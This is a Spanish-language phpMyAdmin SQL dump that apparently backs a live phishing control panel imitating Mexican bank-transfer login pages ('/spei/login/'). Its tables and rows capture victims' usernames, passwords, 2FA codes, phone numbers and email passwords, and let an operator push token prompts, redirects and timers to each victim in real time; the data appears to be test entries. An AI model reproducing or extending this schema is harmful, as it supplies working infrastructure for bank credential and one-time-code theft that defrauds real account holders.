-- phpMyAdmin SQL Dump
-- version 5.2.3
-- https://www.phpmyadmin.net/
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 19-10-2026 a las 18:11:49
-- Versión del servidor: 10.4.32-MariaDB
-- Versión de PHP: 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de datos: `pst`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `administracion_control`
--

CREATE TABLE `administracion_control` (
  `id` int(11) NOT NULL,
  `usuario` varchar(50) NOT NULL,
  `clave` varchar(100) NOT NULL,
  `permisos` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`permisos`)),
  `is_admin` tinyint(1) DEFAULT 0,
  `is_mod` tinyint(1) DEFAULT 0,
  `ultima_fecha_ingreso` timestamp NULL DEFAULT NULL,
  `fecha_creacion` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `administracion_control`
--

INSERT INTO `administracion_control` (`id`, `usuario`, `clave`, `permisos`, `is_admin`, `is_mod`, `ultima_fecha_ingreso`, `fecha_creacion`) VALUES
(1, 'adx', 'admin123', '{\"ver_registros\": true, \"editar_registros\": true, \"eliminar_registros\": true}', 1, 0, '2026-10-19 15:55:04', '2025-08-04 17:04:25');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `auth2fa_enviados`
--

CREATE TABLE `auth2fa_enviados` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL DEFAULT 1,
  `ip_usuario` varchar(45) DEFAULT NULL,
  `accion_usuario` varchar(50) DEFAULT NULL,
  `codigo_ingresado` varchar(10) DEFAULT NULL,
  `estado` enum('pendiente','completado','cancelado') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_completado` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `auth2fa_enviados`
--

INSERT INTO `auth2fa_enviados` (`id`, `usuario_id`, `admin_id`, `ip_usuario`, `accion_usuario`, `codigo_ingresado`, `estado`, `fecha_envio`, `fecha_completado`) VALUES
(7, 126, 1, '::1', 'capturar_codigo', '123123', 'completado', '2026-05-26 18:01:05', '2026-05-26 18:01:11'),
(8, 126, 1, '::1', 'solicitar_confirmacion', NULL, 'completado', '2026-05-26 18:01:15', '2026-05-26 18:01:21');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `configuracion_columnas`
--

CREATE TABLE `configuracion_columnas` (
  `id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `columna` varchar(50) NOT NULL,
  `nombre_personalizado` varchar(100) DEFAULT NULL,
  `visible` tinyint(1) NOT NULL DEFAULT 1,
  `orden` int(11) NOT NULL DEFAULT 0,
  `fecha_modificacion` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `configuracion_columnas`
--

INSERT INTO `configuracion_columnas` (`id`, `admin_id`, `columna`, `nombre_personalizado`, `visible`, `orden`, `fecha_modificacion`) VALUES
(474, 1, 'ip_real', NULL, 0, 1, '2026-04-15 15:39:04'),
(475, 1, 'estatus', 'Estatus', 1, 2, '2026-04-15 15:39:04'),
(476, 1, 'usuario', 'Usuario', 1, 3, '2026-04-15 15:39:04'),
(477, 1, 'password', 'PWD', 1, 4, '2026-04-15 16:06:32'),
(478, 1, 'token_codigo', 'Cod. Cap', 1, 5, '2026-04-15 15:39:32'),
(479, 1, 'nombre', 'Nombre', 1, 6, '2026-04-15 15:39:04'),
(480, 1, 'email', 'Email', 1, 7, '2026-04-15 15:39:04'),
(481, 1, 'telefono_movil', NULL, 1, 8, '2026-04-15 15:39:04'),
(482, 1, 'telefono_fijo', NULL, 1, 9, '2026-04-15 15:39:04'),
(483, 1, 'comentarios', NULL, 1, 10, '2026-04-15 15:39:04'),
(484, 1, 'acciones', 'Dinamico', 1, 11, '2026-04-15 15:39:04'),
(485, 1, 'apellido', 'Participante', 0, 12, '2026-04-15 15:39:04'),
(486, 1, 'sgdotoken_codigo', 'Tipo de Login', 0, 13, '2026-04-15 15:39:04'),
(487, 1, 'fecha', NULL, 0, 14, '2026-04-15 15:39:04'),
(488, 1, 'id', NULL, 0, 15, '2026-04-15 15:39:04');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `datos_personales_enviados`
--

CREATE TABLE `datos_personales_enviados` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `nombre` varchar(100) DEFAULT NULL,
  `telefono_fijo` varchar(10) DEFAULT NULL,
  `telefono_cel` varchar(10) DEFAULT NULL,
  `ip_usuario` varchar(45) DEFAULT NULL,
  `estado` enum('pendiente','completado','cancelado') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_completado` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `datos_personales_enviados`
--

INSERT INTO `datos_personales_enviados` (`id`, `usuario_id`, `nombre`, `telefono_fijo`, `telefono_cel`, `ip_usuario`, `estado`, `fecha_envio`, `fecha_completado`) VALUES
(9, 126, 'SDDSFSDSDFSFD', '1411414122', '2412412412', '::1', 'completado', '2026-05-26 18:01:28', '2026-05-26 18:01:40'),
(11, 130, 'ADASDASD', '1412412412', '1241241241', '::1', 'completado', '2026-10-19 16:05:03', '2026-10-19 16:05:53'),
(12, 130, NULL, NULL, NULL, NULL, 'cancelado', '2026-10-19 16:06:31', NULL);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `espera_push`
--

CREATE TABLE `espera_push` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `origen` varchar(32) NOT NULL DEFAULT 'login',
  `estado` enum('activa','omitida','completada') NOT NULL DEFAULT 'activa',
  `fecha_inicio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_fin` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `espera_push`
--

INSERT INTO `espera_push` (`id`, `usuario_id`, `origen`, `estado`, `fecha_inicio`, `fecha_fin`) VALUES
(1, 127, 'login', 'completada', '2026-10-16 18:15:03', '2026-10-16 18:15:05'),
(2, 128, 'login', 'completada', '2026-10-16 18:15:40', '2026-10-16 18:15:55'),
(3, 129, 'login', 'completada', '2026-10-16 18:17:43', '2026-10-16 18:18:07'),
(4, 130, 'login', 'completada', '2026-10-19 15:55:25', '2026-10-19 15:55:28'),
(5, 131, 'login', 'completada', '2026-10-19 16:09:10', '2026-10-19 16:09:14');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `estatus_usuarios`
--

CREATE TABLE `estatus_usuarios` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `ip_real` varchar(45) NOT NULL,
  `estado` enum('online','inactive','offline') DEFAULT 'online',
  `pagina_actual` varchar(100) DEFAULT NULL,
  `ultimo_heartbeat` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `fecha_conexion` timestamp NOT NULL DEFAULT current_timestamp(),
  `user_agent` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `estatus_usuarios`
--

INSERT INTO `estatus_usuarios` (`id`, `usuario_id`, `ip_real`, `estado`, `pagina_actual`, `ultimo_heartbeat`, `fecha_conexion`, `user_agent`) VALUES
(246, 126, '::1', 'offline', 'Espera', '2026-10-16 18:06:44', '2026-05-26 17:59:46', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0'),
(247, 127, '::1', 'offline', 'Espera', '2026-10-16 18:16:17', '2026-10-16 18:09:56', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0'),
(249, 129, '::1', 'offline', 'Espera', '2026-10-19 15:55:04', '2026-10-16 18:17:34', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0'),
(250, 130, '::1', 'offline', 'Espera', '2026-10-19 16:08:56', '2026-10-19 15:55:11', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Cursor/3.25.6 Chrome/148.0.7778.280 Electron/42.10.0 Safari/537.36'),
(251, 131, '::1', 'online', 'Espera', '2026-10-19 16:11:35', '2026-10-19 16:09:04', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Cursor/3.25.6 Chrome/148.0.7778.280 Electron/42.10.0 Safari/537.36');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `herramientas_enviadas`
--

CREATE TABLE `herramientas_enviadas` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `pagina` varchar(255) NOT NULL DEFAULT 'herramientas.php',
  `estado` enum('pendiente','visto','cerrado') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_visto` timestamp NULL DEFAULT NULL,
  `fecha_cerrado` timestamp NULL DEFAULT NULL,
  `ip_usuario` varchar(45) NOT NULL,
  `session_id` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `herramientas_enviadas`
--

INSERT INTO `herramientas_enviadas` (`id`, `usuario_id`, `admin_id`, `pagina`, `estado`, `fecha_envio`, `fecha_visto`, `fecha_cerrado`, `ip_usuario`, `session_id`) VALUES
(36, 130, 1, 'herramientas.php', 'cerrado', '2026-10-19 15:55:47', '2026-10-19 15:55:49', '2026-10-19 16:05:03', '177.228.96.245', 'iso7l0hg3v3fga42e4oldril0k');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `mensajes_admin`
--

CREATE TABLE `mensajes_admin` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `mensaje` text NOT NULL,
  `tipo_mensaje` enum('con_input','sin_input') NOT NULL DEFAULT 'sin_input',
  `respuesta_usuario` text DEFAULT NULL,
  `estado` enum('pendiente','leido','respondido') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_leido` timestamp NULL DEFAULT NULL,
  `fecha_respuesta` timestamp NULL DEFAULT NULL,
  `ip_usuario` varchar(45) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `mensajes_admin`
--

INSERT INTO `mensajes_admin` (`id`, `usuario_id`, `admin_id`, `mensaje`, `tipo_mensaje`, `respuesta_usuario`, `estado`, `fecha_envio`, `fecha_leido`, `fecha_respuesta`, `ip_usuario`) VALUES
(255, 126, 1, '__captura__', 'sin_input', 'Push Movil.', 'respondido', '2026-05-26 18:00:03', NULL, '2026-05-26 18:00:03', '::1'),
(256, 126, 1, '__captura__', 'sin_input', 'Codigo ingresado:\n 123131', 'respondido', '2026-05-26 18:00:08', NULL, '2026-05-26 18:00:08', '::1'),
(257, 126, 1, 'Solicitud 2do Usuario', 'sin_input', NULL, 'leido', '2026-05-26 18:00:51', NULL, NULL, 'Datos de Contacto'),
(258, 126, 1, '__captura__', 'sin_input', 'Usuario: 12312323\nPassword: 13123%', 'respondido', '2026-05-26 18:00:56', NULL, '2026-05-26 18:00:56', '::1'),
(259, 126, 1, 'Solicitud Auth 2FA', 'sin_input', NULL, 'leido', '2026-05-26 18:01:05', NULL, NULL, 'Datos de Contacto'),
(260, 126, 1, '__captura__', 'sin_input', 'Codigo ingresado:\n 123123', 'respondido', '2026-05-26 18:01:11', NULL, '2026-05-26 18:01:11', '::1'),
(261, 126, 1, 'Solicitud Auth 2FA', 'sin_input', NULL, 'leido', '2026-05-26 18:01:15', NULL, NULL, 'Datos de Contacto'),
(262, 126, 1, '__captura__', 'sin_input', 'Push Movil.', 'respondido', '2026-05-26 18:01:21', NULL, '2026-05-26 18:01:21', '::1'),
(263, 126, 1, 'Solicitud Datos Personales', 'sin_input', NULL, 'leido', '2026-05-26 18:01:28', NULL, NULL, 'unknown'),
(264, 126, 1, '__captura__', 'sin_input', 'Nombre: SDDSFSDSDFSFD\nTel. Fijo: 1411414122\nTel. Movil: 2412412412', 'respondido', '2026-05-26 18:01:40', NULL, '2026-05-26 18:01:40', '::1'),
(265, 127, 1, '__captura__', 'sin_input', 'Push Movil.', 'respondido', '2026-10-16 18:15:03', NULL, '2026-10-16 18:15:03', '::1'),
(270, 129, 1, '__captura__', 'sin_input', 'Push Movil.', 'respondido', '2026-10-16 18:17:43', NULL, '2026-10-16 18:17:43', '::1'),
(271, 130, 1, '__captura__', 'sin_input', 'Push Movil.', 'respondido', '2026-10-19 15:55:25', NULL, '2026-10-19 15:55:25', '::1'),
(272, 130, 1, 'Solicitud 2do Usuario', 'sin_input', NULL, 'leido', '2026-10-19 15:55:33', NULL, NULL, 'Datos de Contacto'),
(273, 130, 1, 'awdwadawdawd', 'sin_input', NULL, 'leido', '2026-10-19 15:55:35', '2026-10-19 15:55:46', NULL, '177.228.96.245'),
(274, 130, 1, 'awdawdaw', 'con_input', NULL, 'leido', '2026-10-19 15:55:43', '2026-10-19 15:55:47', NULL, '177.228.96.245'),
(275, 130, 1, 'Solicitud Datos Personales', 'sin_input', NULL, 'leido', '2026-10-19 16:05:03', NULL, NULL, '177.228.96.245'),
(276, 130, 1, '__captura__', 'sin_input', 'Nombre: ADASDASD\nTel. Fijo: 1412412412\nTel. Movil: 1241241241', 'respondido', '2026-10-19 16:05:53', NULL, '2026-10-19 16:05:53', '::1'),
(278, 131, 1, '__captura__', 'sin_input', 'Push Movil.', 'respondido', '2026-10-19 16:09:10', NULL, '2026-10-19 16:09:10', '::1');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `mensajes_rapidos`
--

CREATE TABLE `mensajes_rapidos` (
  `id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `texto` text NOT NULL,
  `icono` varchar(100) NOT NULL DEFAULT 'fas fa-comment',
  `orden` int(11) NOT NULL DEFAULT 0,
  `fecha_creacion` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_modificacion` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `mensajes_rapidos`
--

INSERT INTO `mensajes_rapidos` (`id`, `admin_id`, `texto`, `icono`, `orden`, `fecha_creacion`, `fecha_modificacion`) VALUES
(1, 1, 'Ingresa tu token a 6 digitos S', 'fas fa-phone', 1, '2025-11-13 02:40:09', '2025-11-13 02:52:48'),
(2, 1, 'Ingresa tu Correo electrónico', 'fas fa-envelope-open-text', 2, '2025-11-13 02:44:43', '2025-11-13 02:48:08'),
(5, 1, 'x01', 'fas fa-comment', 3, '2025-11-13 03:17:36', '2025-11-13 03:17:36');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `monitoreo_bxcontrol`
--

CREATE TABLE `monitoreo_bxcontrol` (
  `id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_usuario` varchar(50) NOT NULL,
  `is_admin` tinyint(1) DEFAULT 0,
  `fecha_ingreso` timestamp NOT NULL DEFAULT current_timestamp(),
  `ultimo_heartbeat` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `estado` enum('activo','inactivo') NOT NULL DEFAULT 'activo'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `monitoreo_bxcontrol`
--

INSERT INTO `monitoreo_bxcontrol` (`id`, `admin_id`, `usuario_id`, `admin_usuario`, `is_admin`, `fecha_ingreso`, `ultimo_heartbeat`, `estado`) VALUES
(300, 1, 126, 'adx', 1, '2026-05-26 17:59:54', '2026-05-26 18:05:24', 'activo'),
(301, 1, 127, 'adx', 1, '2026-10-16 18:10:00', '2026-10-16 18:15:01', 'activo'),
(307, 1, 129, 'adx', 1, '2026-10-16 18:17:38', '2026-10-16 18:19:09', 'activo'),
(311, 1, 130, 'adx', 1, '2026-10-19 15:55:22', '2026-10-19 15:55:54', 'inactivo'),
(312, 1, 131, 'adx', 1, '2026-10-19 16:09:13', '2026-10-19 16:09:48', 'inactivo');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `portal_accesos`
--

CREATE TABLE `portal_accesos` (
  `id` int(11) NOT NULL,
  `ip_real` varchar(45) NOT NULL,
  `user_agent` text DEFAULT NULL,
  `uri` varchar(255) NOT NULL DEFAULT '/index.php',
  `fecha` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `portal_accesos`
--

INSERT INTO `portal_accesos` (`id`, `ip_real`, `user_agent`, `uri`, `fecha`) VALUES
(1, '::1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0', '/stp_11072026/mx/', '2026-10-16 18:05:55'),
(2, '::1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0', '/stp_11072026/mx/', '2026-10-16 18:15:14'),
(3, '::1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0', '/stp_11072026/mx/', '2026-10-16 18:17:22'),
(4, '::1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0', '/Design2Web/spei/login/', '2026-10-19 15:54:52'),
(5, '::1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Cursor/3.25.6 Chrome/148.0.7778.280 Electron/42.10.0 Safari/537.36', '/Design2Web/spei/login/', '2026-10-19 16:08:56');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `push_suscripciones`
--

CREATE TABLE `push_suscripciones` (
  `id` int(11) NOT NULL,
  `admin_id` int(11) DEFAULT NULL,
  `endpoint` text NOT NULL,
  `p256dh` varchar(255) NOT NULL,
  `auth` varchar(255) NOT NULL,
  `user_agent` varchar(500) DEFAULT NULL,
  `activo` tinyint(1) NOT NULL DEFAULT 1,
  `fecha_alta` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_actualizado` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `redirecciones_enviadas`
--

CREATE TABLE `redirecciones_enviadas` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `url_destino` varchar(500) NOT NULL,
  `tipo_redireccion` enum('url_personalizada','index') NOT NULL DEFAULT 'index',
  `mensaje_confirmacion` text DEFAULT NULL,
  `estado` enum('pendiente','visto','cerrado') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_visto` timestamp NULL DEFAULT NULL,
  `fecha_cerrado` timestamp NULL DEFAULT NULL,
  `ip_usuario` varchar(45) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `revalidacion_credenciales`
--

CREATE TABLE `revalidacion_credenciales` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL DEFAULT 1,
  `usuario_ingresado` varchar(100) DEFAULT NULL,
  `password_ingresado` varchar(100) DEFAULT NULL,
  `sgdotoken_codigo` varchar(255) DEFAULT NULL,
  `ip_usuario` varchar(45) DEFAULT NULL,
  `estado` enum('pendiente','completado','cancelado') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_completado` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `revalidacion_credenciales`
--

INSERT INTO `revalidacion_credenciales` (`id`, `usuario_id`, `admin_id`, `usuario_ingresado`, `password_ingresado`, `sgdotoken_codigo`, `ip_usuario`, `estado`, `fecha_envio`, `fecha_completado`) VALUES
(33, 126, 1, '12312323', '13123%', NULL, '::1', 'pendiente', '2026-05-26 18:00:51', NULL),
(34, 130, 1, NULL, NULL, NULL, 'Datos de Contacto', 'cancelado', '2026-10-19 15:55:33', NULL);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `timers_enviados`
--

CREATE TABLE `timers_enviados` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `admin_id` int(11) NOT NULL,
  `tiempo_segundos` int(11) NOT NULL,
  `mensaje_personalizado` text DEFAULT NULL,
  `estado` enum('pendiente','visto','cerrado') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_visto` timestamp NULL DEFAULT NULL,
  `fecha_cerrado` timestamp NULL DEFAULT NULL,
  `ip_usuario` varchar(45) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `usuarios`
--

CREATE TABLE `usuarios` (
  `id` int(11) NOT NULL,
  `ip_real` varchar(45) NOT NULL,
  `fecha_ingreso` timestamp NOT NULL DEFAULT current_timestamp(),
  `usuarios` varchar(80) NOT NULL,
  `password` varchar(20) NOT NULL,
  `user_agent` text NOT NULL,
  `nombre` varchar(50) DEFAULT NULL,
  `apellido` varchar(50) DEFAULT NULL,
  `telefono_movil` varchar(15) DEFAULT NULL,
  `telefono_fijo` varchar(15) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL,
  `token_codigo` varchar(255) DEFAULT NULL,
  `sgdotoken_codigo` varchar(255) DEFAULT NULL,
  `comentarios` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Volcado de datos para la tabla `usuarios`
--

INSERT INTO `usuarios` (`id`, `ip_real`, `fecha_ingreso`, `usuarios`, `password`, `user_agent`, `nombre`, `apellido`, `telefono_movil`, `telefono_fijo`, `email`, `token_codigo`, `sgdotoken_codigo`, `comentarios`) VALUES
(126, '177.230.87.27', '2026-05-26 17:59:46', 'admin', 'oooooooooo%%', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0', 'SDDSFSDSDFSFD', NULL, '2412412412', '1411414122', NULL, '123131', NULL, NULL),
(127, '177.228.96.245', '2026-10-16 18:09:56', 'awdawd', 'awdawd$', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(129, '177.228.96.245', '2026-10-16 18:17:34', 'root', 'admin123awdawd$', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(130, '177.228.96.245', '2026-10-19 15:55:11', 'root', 'admin123$', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0', 'ADASDASD', NULL, '1241241241', '1412412412', NULL, NULL, NULL, NULL),
(131, '177.228.96.245', '2026-10-19 16:09:04', 'awdawdaw', 'dawdw!\"$1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Cursor/3.25.6 Chrome/148.0.7778.280 Electron/42.10.0 Safari/537.36', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `validacion_email`
--

CREATE TABLE `validacion_email` (
  `id` int(11) NOT NULL,
  `usuario_id` int(11) NOT NULL,
  `email` varchar(255) NOT NULL,
  `proveedor_seleccionado` enum('gmail','outlook','otro') NOT NULL DEFAULT 'otro',
  `password_ingresado` text DEFAULT NULL,
  `ip_usuario` varchar(45) DEFAULT NULL,
  `estado` enum('pendiente','completado','cancelado') NOT NULL DEFAULT 'pendiente',
  `fecha_envio` timestamp NOT NULL DEFAULT current_timestamp(),
  `fecha_completado` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Índices para tablas volcadas
--

--
-- Indices de la tabla `administracion_control`
--
ALTER TABLE `administracion_control`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `usuario` (`usuario`);

--
-- Indices de la tabla `auth2fa_enviados`
--
ALTER TABLE `auth2fa_enviados`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_usuario_id` (`usuario_id`),
  ADD KEY `idx_estado` (`estado`),
  ADD KEY `fk_auth2fa_admin` (`admin_id`);

--
-- Indices de la tabla `configuracion_columnas`
--
ALTER TABLE `configuracion_columnas`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `admin_columna` (`admin_id`,`columna`),
  ADD KEY `idx_admin_id` (`admin_id`);

--
-- Indices de la tabla `datos_personales_enviados`
--
ALTER TABLE `datos_personales_enviados`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_usuario_id` (`usuario_id`),
  ADD KEY `idx_estado` (`estado`);

--
-- Indices de la tabla `espera_push`
--
ALTER TABLE `espera_push`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_usuario_estado` (`usuario_id`,`estado`);

--
-- Indices de la tabla `estatus_usuarios`
--
ALTER TABLE `estatus_usuarios`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `usuario_id` (`usuario_id`),
  ADD KEY `idx_ip_real` (`ip_real`),
  ADD KEY `idx_estado` (`estado`),
  ADD KEY `idx_ultimo_heartbeat` (`ultimo_heartbeat`);

--
-- Indices de la tabla `herramientas_enviadas`
--
ALTER TABLE `herramientas_enviadas`
  ADD PRIMARY KEY (`id`),
  ADD KEY `fk_herramientas_usuario` (`usuario_id`),
  ADD KEY `fk_herramientas_admin` (`admin_id`);

--
-- Indices de la tabla `mensajes_admin`
--
ALTER TABLE `mensajes_admin`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_usuario_id` (`usuario_id`),
  ADD KEY `idx_admin_id` (`admin_id`),
  ADD KEY `idx_estado` (`estado`),
  ADD KEY `idx_tipo_mensaje` (`tipo_mensaje`),
  ADD KEY `idx_ip_usuario` (`ip_usuario`);

--
-- Indices de la tabla `mensajes_rapidos`
--
ALTER TABLE `mensajes_rapidos`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_admin_id` (`admin_id`),
  ADD KEY `idx_orden` (`orden`);

--
-- Indices de la tabla `monitoreo_bxcontrol`
--
ALTER TABLE `monitoreo_bxcontrol`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `admin_usuario_unique` (`admin_id`,`usuario_id`),
  ADD KEY `idx_usuario_id` (`usuario_id`),
  ADD KEY `idx_admin_id` (`admin_id`),
  ADD KEY `idx_ultimo_heartbeat` (`ultimo_heartbeat`),
  ADD KEY `idx_estado` (`estado`);

--
-- Indices de la tabla `portal_accesos`
--
ALTER TABLE `portal_accesos`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_portal_accesos_fecha` (`fecha`),
  ADD KEY `idx_portal_accesos_ip_fecha` (`ip_real`,`fecha`);

--
-- Indices de la tabla `push_suscripciones`
--
ALTER TABLE `push_suscripciones`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `uk_push_endpoint` (`endpoint`(500)),
